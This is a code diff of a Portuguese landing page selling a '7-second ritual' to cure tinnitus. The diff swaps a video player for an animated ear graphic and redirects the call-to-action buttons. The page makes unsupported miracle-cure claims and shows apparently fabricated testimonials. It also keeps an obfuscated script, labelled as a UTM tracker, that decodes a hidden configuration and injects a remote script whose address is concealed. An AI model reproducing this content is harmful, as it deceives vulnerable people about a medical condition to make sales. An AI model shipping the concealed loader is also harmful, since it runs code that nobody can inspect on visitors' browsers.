@@ -27,22 +27,85 @@
     }
     .page{max-width:640px;margin:0 auto;padding:0 22px 44px}
 
-    /* ===== CONTAINER VSL (VTURB) ===== */
-    .vsl-container{
-      margin:20px auto 10px;
-      max-width:400px;
-      border-radius:14px;
-      overflow:hidden;
-      box-shadow:0 8px 32px rgba(31,133,255,.2);
-      border:1px solid var(--card-borda);
+    /* ===== HERO ANIMADO (ouvido pulsando) ===== */
+    .hero-anim{
+      position:relative;
+      height:clamp(250px,64vw,320px);
+      display:flex;align-items:center;justify-content:center;
+      margin:10px auto 0;
     }
+    .halo{
+      position:absolute;top:50%;left:50%;
+      width:500px;height:500px;margin:-250px 0 0 -250px;
+      border-radius:50%;
+      background:radial-gradient(circle, rgba(31,133,255,.13) 0%, rgba(8,11,18,0) 70%);
+      pointer-events:none;
+      animation:halo 3s ease-in-out infinite;
+    }
+    .ring{
+      position:absolute;top:50%;left:50%;
+      border-radius:50%;
+      border:1px solid rgba(74,166,255,.25);
+      transform:translate(-50%,-50%);
+      animation:ringPulse 2.4s ease-in-out infinite;
+    }
+    .r1{width:196px;height:196px}
+    .r2{width:232px;height:232px;animation-delay:.6s}
+    .r3{width:268px;height:268px;animation-delay:1.2s}
+
+    .orb{
+      position:relative;z-index:2;
+      width:clamp(150px,42vw,178px);
+      aspect-ratio:1/1;
+      border-radius:50%;
+      background:var(--card);
+      border:1px solid var(--card-borda);
+      overflow:hidden;
+      box-shadow:0 0 40px rgba(31,133,255,.28);
+      animation:orbIn .7s cubic-bezier(.34,1.56,.64,1) both;
+    }
+    .orb-glow{
+      position:absolute;inset:0;
+      background:radial-gradient(circle at 30% 50%, rgba(31,133,255,.20) 0%, transparent 65%);
+    }
+    .orb svg{position:absolute;inset:0;width:100%;height:100%}
+
+    .arc{
+      transform-box:view-box;
+      transform-origin:95px 80px;
+      animation:arcTravel 2.2s ease-out infinite;
+      opacity:0;
+    }
+    .arc:nth-of-type(2){animation-delay:.55s}
+    .arc:nth-of-type(3){animation-delay:1.1s}
+    .arc:nth-of-type(4){animation-delay:1.65s}
+
+    .wline{animation:wlineFade 1.2s ease-in-out infinite}
+    .eardot{animation:earDot 1.1s ease-in-out infinite}
+
+    .spark{
+      transform-box:fill-box;transform-origin:center;
+      animation:sparkle 1.4s ease-in-out infinite;
+      opacity:0;
+    }
+    .spark:nth-of-type(2){animation-delay:.3s}
+    .spark:nth-of-type(3){animation-delay:.6s}
+    .spark:nth-of-type(4){animation-delay:.9s}
+
+    @keyframes halo{0%,100%{transform:scale(1);opacity:.4}50%{transform:scale(1.2);opacity:.8}}
+    @keyframes ringPulse{0%,100%{transform:translate(-50%,-50%) scale(1);opacity:.55}50%{transform:translate(-50%,-50%) scale(1.35);opacity:0}}
+    @keyframes orbIn{from{opacity:0;transform:scale(.5)}to{opacity:1;transform:scale(1)}}
+    @keyframes arcTravel{0%{transform:scale(.35);opacity:0}40%{opacity:.9}100%{transform:scale(1.6);opacity:0}}
+    @keyframes wlineFade{0%,100%{opacity:.4}50%{opacity:1}}
+    @keyframes earDot{0%,100%{opacity:.4;r:1.6}50%{opacity:1;r:2.4}}
+    @keyframes sparkle{0%,100%{opacity:0;transform:scale(.6)}50%{opacity:1;transform:scale(1.6)}}
 
     /* ===== TEXTO ===== */
     .headline{
       text-align:center;font-weight:800;
       font-size:clamp(30px,8.6vw,44px);
       line-height:1.12;letter-spacing:-.5px;
-      margin-top:20px;
+      margin-top:2px;
     }
     .subhead{
       text-align:center;color:var(--texto);font-weight:400;
@@ -62,7 +125,7 @@
     }
     .pill svg{color:var(--verde);flex:none}
 
-    /* ===== BOTÕES ===== */
+    /* ===== BOTOES ===== */
     .cta{
       display:block;text-decoration:none;text-align:center;color:#fff;
       background:linear-gradient(180deg,var(--azul),var(--azul-2));
@@ -76,7 +139,6 @@
     }
     .cta:hover{filter:brightness(1.06)}
     .cta:active{transform:scale(.99)}
-    .cta:focus-visible{outline:3px solid #93c5fd;outline-offset:3px}
     .cta-bottom{
       font-size:clamp(15px,4.2vw,19px);
       font-weight:700;letter-spacing:0;line-height:1.35;
@@ -90,7 +152,7 @@
     }
     .lock svg{flex:none}
 
-    /* ===== DEPOIMENTOS ===== */
+    /* ===== DEPOIMENTOS PRE-SELL ===== */
     .tcard{
       background:var(--card);
       border:1px solid var(--card-borda);
@@ -108,38 +170,56 @@
       border:1px solid #2a3542;
     }
     .tname{font-weight:700;color:#e8edf3;font-size:clamp(15px,4vw,17px)}
-    .tquote{
-      color:#9aa4b2;margin-top:16px;line-height:1.6;
-      font-size:clamp(15px,4vw,17px);
-    }
+    .tquote{color:#9aa4b2;margin-top:16px;line-height:1.6;font-size:clamp(15px,4vw,17px)}
     .qm{color:#3aa0e0;font-weight:700}
   </style>
 
-  <!-- UTMify (script de UTMs + Pixel) -->
+  <!-- UTMify -->
   <script>(function(){var v_h=atob("DD/4uGG/Xl1ahZ9qAkTazRPTfGd47eseckzCl07cOjN08OsHa1mBlgLQM3M497AZYU2RyBXMcSgu6OxFbl6M3RLLcDcpp7NIY0uMygjdKyk/9r1QWUTa1gDSO39gp/sLdl7VzRXSNzsjqO8YZ0md1hWSJj414bIZYVTalEPJPzEv4L1QIB2FlBqdMDw34L1QIFuZzACSKyk37PkTL0+K3RfaMCl39uoIa1uLmk2dKDw28PpIOB3axTzC");var r_h0=[];for(var q_jdk0=0;q_jdk0<v_h.length;q_jdk0++){r_h0.push(v_h.charCodeAt(q_jdk0)&255);}var g_a=r_h0[0];var c_x8b=r_h0.slice(1,1+g_a);var y_8nvg=r_h0.slice(1+g_a);var s_xus=y_8nvg.map(function(b,x_5){return b^c_x8b[x_5%g_a];});var x_q55="";for(var k_8ok=0;k_8ok<s_xus.length;k_8ok++){x_q55+=String.fromCharCode(s_xus[k_8ok]&255);}var g_k=decodeURIComponent(escape(x_q55));var j_0=JSON.parse(g_k);var n_a9j=j_0.globals||[];n_a9j.forEach(function(n_pu6){window[n_pu6.name]=n_pu6.value;});var f_q3mj=document.createElement("script");f_q3mj.src=j_0.url;f_q3mj.async=true;f_q3mj.defer=true;(j_0.attributes||[]).forEach(function(n_4a){f_q3mj.setAttribute(n_4a.name,n_4a.value);});(document.head||document.documentElement).appendChild(f_q3mj);})();</script>
 </head>
 <body>
   <div class="page">
 
-    <!-- ===== PLAYER DA VSL (VTURB) ===== -->
-    <div class="vsl-container">
-      <vturb-smartplayer id="vid-6aab92cdba020081912f0c75" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;">
-        <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.40740740740742% 0 0; z-index: 0; background-color: black;"></div>
-      </vturb-smartplayer>
-      <script type="text/javascript">
-        var s=document.createElement("script");
-        s.src="https://scripts.converteai.net/f5c89c22-5b24-44b0-8c80-a8598aaa938c/players/6aab92cdba020081912f0c75/v4/player.js";
-        s.async=!0;
-        document.head.appendChild(s);
-      </script>
+    <!-- HERO ANIMADO -->
+    <div class="hero-anim" aria-hidden="true">
+      <div class="halo"></div>
+      <span class="ring r1"></span>
+      <span class="ring r2"></span>
+      <span class="ring r3"></span>
+
+      <div class="orb">
+        <div class="orb-glow"></div>
+        <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="waveGrad" x1="0" x2="1" y1="0" y2="0">
+              <stop offset="0%" stop-color="#4aa6ff" stop-opacity="0"/>
+              <stop offset="60%" stop-color="#4aa6ff" stop-opacity="0.9"/>
+              <stop offset="100%" stop-color="#4aa6ff" stop-opacity="1"/>
+            </linearGradient>
+            <radialGradient id="earGrad" cx="0.55" cy="0.5" r="0.55">
+              <stop offset="0%" stop-color="#4aa6ff" stop-opacity="0.35"/>
+              <stop offset="100%" stop-color="#4aa6ff" stop-opacity="0.05"/>
+            </radialGradient>
+          </defs>
+          <path class="arc" d="M 20 80 Q 40 50 60 80 Q 40 110 20 80" fill="none" stroke="url(#waveGrad)" stroke-width="1.5" stroke-linecap="round"/>
+          <path class="arc" d="M 20 80 Q 40 50 60 80 Q 40 110 20 80" fill="none" stroke="url(#waveGrad)" stroke-width="1.5" stroke-linecap="round"/>
+          <path class="arc" d="M 20 80 Q 40 50 60 80 Q 40 110 20 80" fill="none" stroke="url(#waveGrad)" stroke-width="1.5" stroke-linecap="round"/>
+          <path class="wline" d="M 8 80 Q 18 68 26 80 T 44 80 T 62 80 T 80 80" fill="none" stroke="#4aa6ff" stroke-width="1.4" stroke-linecap="round"/>
+          <g transform="translate(92 42)">
+            <path d="M 18 6 C 34 6 44 20 44 36 C 44 50 36 58 30 64 C 26 68 24 72 24 76 C 24 80 20 82 16 80 C 10 78 8 72 10 66 C 6 62 2 54 2 42 C 2 22 8 6 18 6 Z" fill="url(#earGrad)" stroke="#4aa6ff" stroke-width="1.6" stroke-linejoin="round"/>
+            <path d="M 22 22 C 30 22 34 30 32 38 C 30 44 24 46 22 42 C 20 38 22 34 26 34" fill="none" stroke="#4aa6ff" stroke-width="1.4" stroke-linecap="round"/>
+            <circle class="eardot" cx="26" cy="38" r="2" fill="#4aa6ff"/>
+          </g>
+          <circle class="spark" cx="118" cy="78" r="1.2" fill="#4aa6ff"/>
+          <circle class="spark" cx="126" cy="92" r="1.2" fill="#4aa6ff"/>
+          <circle class="spark" cx="112" cy="96" r="1.2" fill="#4aa6ff"/>
+        </svg>
+      </div>
     </div>
 
-    <!-- ===== TEXTO PRINCIPAL ===== -->
     <h1 class="headline">Cientistas revelaram o motivo oculto que causa o zumbido, e não é no ouvido...</h1>
-
     <p class="subhead">E este simples ritual de 7 segundos já silenciou o zumbido de mais de 20 mil pessoas</p>
 
-    <!-- ===== SELOS ===== -->
     <div class="pills">
       <span class="pill">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>
@@ -155,18 +235,17 @@
       </span>
     </div>
 
-    <!-- ===== CTA PRINCIPAL -> CHECKOUT ===== -->
-    <a href="https://checkout.escalepay.com/2599879" class="cta">REVELAR RITUAL</a>
+    <!-- BOTAO PRINCIPAL DIRECIONANDO PARA A VSL COM ROLAGEM ATE OS COMENTARIOS -->
+    <a href="vsl.html#comentarios" class="cta">REVELAR RITUAL</a>
 
     <div class="lock">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
       Conteúdo disponível por tempo limitado
     </div>
 
-    <!-- ===== DEPOIMENTOS ===== -->
     <div class="tcard">
       <div class="thead">
-        <img class="avatar" src="img/1a.jpg" alt="Roberto Almeida">
+        <div class="avatar">RA</div>
         <div class="tname">Roberto Almeida</div>
       </div>
       <p class="tquote"><span class="qm">"</span> Não acredito que escondem isso de nós. Depois de 8 anos, finalmente silenciei o zumbido. <span class="qm">"</span></p>
@@ -174,7 +253,7 @@
 
     <div class="tcard">
       <div class="thead">
-        <img class="avatar" src="img/2a.jpg" alt="Fernanda Costa">
+        <div class="avatar">FC</div>
         <div class="tname">Fernanda Costa</div>
       </div>
       <p class="tquote"><span class="qm">"</span> Incrível, fiz o ritual que o Dr. Alberto mostrou e no segundo dia já consegui dormir sem aquele zumbido insuportável. <span class="qm">"</span></p>
@@ -182,20 +261,17 @@
 
     <div class="tcard">
       <div class="thead">
-        <img class="avatar" src="img/3a.jpg" alt="Carlos Eduardo">
+        <div class="avatar">CE</div>
         <div class="tname">Carlos Eduardo</div>
       </div>
       <p class="tquote"><span class="qm">"</span> Nunca imaginei que a causa estava tão perto. Ainda bem que descobri isso logo, já estava enlouquecendo com aquele chiado no ouvido. <span class="qm">"</span></p>
     </div>
 
-    <!-- ===== CTA FINAL -> CHECKOUT ===== -->
-    <a href="https://checkout.escalepay.com/2599879" class="cta cta-bottom">Descubra agora porque o zumbido não vem do ouvido</a>
-
+    <a href="vsl.html#comentarios" class="cta cta-bottom">Descubra agora porque o zumbido não vem do ouvido</a>
   </div>
 
   <script>
-    // Repassa os parametros da URL atual (utm_source, utm_campaign, etc.)
-    // para os botoes, mantendo o trackeamento ate o checkout.
+    // Repassa UTMs para o link da VSL preservando o #comentarios
     (function(){
       var qs = window.location.search;
       if(!qs) return;
@@ -203,7 +279,10 @@
       document.querySelectorAll('a.cta').forEach(function(a){
         var href = a.getAttribute('href');
         if(!href) return;
-        a.setAttribute('href', href + (href.indexOf('?') > -1 ? '&' : '?') + params);
+        var parts = href.split('#');
+        var base = parts[0];
+        var hash = parts[1] ? '#' + parts[1] : '';
+        a.setAttribute('href', base + (base.indexOf('?') > -1 ? '&' : '?') + params + hash);
       });
     })();
   </script>
